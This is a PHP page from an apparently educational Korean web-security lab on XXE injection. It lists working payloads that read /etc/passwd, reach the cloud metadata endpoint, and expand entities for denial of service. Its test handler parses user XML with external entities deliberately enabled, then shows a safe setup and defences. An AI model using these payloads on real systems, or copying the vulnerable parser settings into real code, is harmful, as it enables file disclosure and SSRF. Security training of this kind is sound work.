<?php
// 출력 버퍼링 시작 (헤더 전송 문제 방지)
ob_start();

// 세션 시작 (TestPage 전에)
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

require_once __DIR__ . "/../db.php";
require_once __DIR__ . "/../utils.php";

// 로그인 확인
if (!is_logged_in()) {
    header("Location: ../login.php");
    exit();
}

require_once 'TestPage.php';

// 1. 페이지 설정
$page_title = 'XXE (XML External Entity)';
$description = '<p><strong>XXE (XML External Entity)</strong>는 XML 파서가 외부 엔티티를 처리할 때 발생하는 취약점입니다.</p>
<p>로컬 파일 읽기, SSRF 공격, DoS 공격 등이 가능합니다.</p>';

// 2. 페이로드 정의
$payloads = [
    'file' => [
        'title' => '파일 읽기 페이로드',
        'description' => '외부 엔티티를 통해 로컬 파일을 읽습니다.',
        'payloads' => [
            '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
    <!ENTITY file SYSTEM "file:///etc/passwd">
]>
<root>
    <data>&file;</data>
</root>'
        ]
    ],
    'ssrf' => [
        'title' => 'SSRF 공격 페이로드',
        'description' => '외부 엔티티를 통해 내부 네트워크에 요청을 보냅니다.',
        'payloads' => [
            '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
    <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>
    <data>&ssrf;</data>
</root>'
        ]
    ],
    'dos' => [
        'title' => 'DoS 공격 페이로드',
        'description' => '재귀적인 엔티티 정의를 통해 XML 파서를 과부하시켜 DoS를 유발합니다.',
        'payloads' => [
            '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
    <!ENTITY lol "lol">
    <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<root>
    <data>&lol3;</data>
</root>'
        ]
    ]
];

// 3. 방어 방법 정의
$defense_methods = [
    "<strong>외부 엔티티 비활성화:</strong> `libxml_disable_entity_loader(true)` 사용 (PHP)",
    "<strong>안전한 파서 설정:</strong> `LIBXML_NOENT`, `LIBXML_DTDLOAD` 플래그 제거",
    "<strong>입력 검증:</strong> `DOCTYPE`, `ENTITY` 선언 필터링",
    "<strong>JSON 사용:</strong> 가능한 경우 XML 대신 JSON 사용",
    "<strong>네트워크 분리:</strong> XML 파서를 격리된 환경에서 실행"
];

// 4. 참고 자료 정의
$references = [
    "OWASP - XXE Injection" => "https://owasp.org/www-community/attacks/XML_External_Entity_(XXE)_Injection",
    "PortSwigger - XXE injection" => "https://portswigger.net/web-security/xxe"
];

// 5. 테스트 폼 UI 정의
$xml_input = htmlspecialchars($_POST["payload"] ?? '');
$test_form_ui = <<<HTML
<form method="post" class="test-form">
    <h3>🧪 XXE 테스트</h3>
    <label for="payload">🎯 XML 데이터 입력:</label><br>
    <textarea id="payload" name="payload" placeholder="XML 데이터를 입력하세요...">{$xml_input}</textarea><br><br>
    <button type="submit" class="btn">XML 파싱</button>
</form>
HTML;

// 6. 테스트 로직 콜백 정의
$test_logic_callback = function($form_data) {
    $xml_input = $form_data['payload'] ?? '';
    $result = '';
    $error = '';

    if (empty($xml_input)) {
        $error = "XML 데이터를 입력해주세요.";
        return ['result' => '', 'error' => $error];
    }

    $result .= "<div class='vulnerable-output'>";
    $result .= "<h4>🚨 취약한 XML 파싱 실행 결과</h4>";
    
    // 실제 XXE 공격 실행 (교육 목적)
    try {
        // 외부 엔티티 로딩 활성화 (취약한 설정)
        $previous_value = libxml_disable_entity_loader(false);
        
        // XML 파서 생성 (외부 엔티티 허용)
        $dom = new DOMDocument();
        $dom->resolveExternals = true;
        $dom->substituteEntities = true;
        
        // 실제 XML 파싱 시도
        $parsed = $dom->loadXML($xml_input, LIBXML_DTDLOAD | LIBXML_NOENT);
        
        if ($parsed) {
            $xml_content = $dom->saveXML();
            $result .= "<p><strong>파싱된 XML 결과:</strong></p>";
            $result .= "<pre class='attack-result'>" . htmlspecialchars($xml_content) . "</pre>";
            
            // 실제 파일 읽기 시도 확인
            if (strpos($xml_content, 'root:x:') !== false || strpos($xml_content, '/bin/') !== false) {
                $result .= "<p class='danger'>🔥 <strong>실제 파일 읽기 성공!</strong> /etc/passwd 파일이 노출되었습니다.</p>";
            } elseif (strpos($xml_content, '<?xml') !== false && strpos($xml_content, '&') === false) {
                $result .= "<p class='warning'>⚠️ XML 파싱은 성공했으나 외부 엔티티 해석에 실패했습니다.</p>";
            }
        } else {
            $result .= "<p class='error'>❌ XML 파싱 실패: " . htmlspecialchars(libxml_get_last_error()->message ?? 'Unknown error') . "</p>";
        }
        
        // 설정 복원
        libxml_disable_entity_loader($previous_value);
        
    } catch (Exception $e) {
        $result .= "<p class='error'>❌ XXE 실행 중 오류: " . htmlspecialchars($e->getMessage()) . "</p>";
    }
    
    $result .= "</div>";
    
    // 안전한 구현 비교
    $result .= "<div class='safe-comparison'>";
    $result .= "<h4>✅ 안전한 XML 파싱 구현</h4>";
    
    try {
        // 안전한 설정으로 파싱
        libxml_disable_entity_loader(true);
        $safe_dom = new DOMDocument();
        $safe_dom->resolveExternals = false;
        $safe_dom->substituteEntities = false;
        
        $safe_parsed = $safe_dom->loadXML($xml_input, LIBXML_NONET | LIBXML_NOCDATA);
        
        if ($safe_parsed) {
            $safe_content = $safe_dom->saveXML();
            $result .= "<p><strong>안전한 파싱 결과:</strong></p>";
            $result .= "<pre class='safe-result'>" . htmlspecialchars($safe_content) . "</pre>";
            $result .= "<p class='success'>🛡️ 외부 엔티티가 비활성화되어 안전하게 파싱되었습니다.</p>";
        }
        
    } catch (Exception $e) {
        $result .= "<p>안전한 파싱도 실패: " . htmlspecialchars($e->getMessage()) . "</p>";
    }
    
    $result .= "</div>";
    
    // 보안 권장사항
    $result .= "<div class='security-recommendations'>";
    $result .= "<h4>🔒 보안 권장사항</h4>";
    $result .= "<ul>";
    $result .= "<li><code>libxml_disable_entity_loader(true)</code>로 외부 엔티티 비활성화</li>";
    $result .= "<li><code>LIBXML_NOENT</code>, <code>LIBXML_DTDLOAD</code> 플래그 제거</li>";
    $result .= "<li>입력 데이터에서 <code>DOCTYPE</code>, <code>ENTITY</code> 선언 필터링</li>";
    $result .= "<li>가능하면 XML 대신 JSON 사용 고려</li>";
    $result .= "<li>XML 파서를 격리된 환경에서 실행</li>";
    $result .= "</ul>";
    $result .= "</div>";

    return ['result' => $result, 'error' => $error];
};

// 7. TestPage 인스턴스 생성 및 실행
$test_page = new TestPage($page_title, $description, $payloads, $defense_methods, $references, "XXE_Analysis.md");
$test_page->set_test_form($test_form_ui);
$test_page->set_test_logic($test_logic_callback);
$test_page->run();

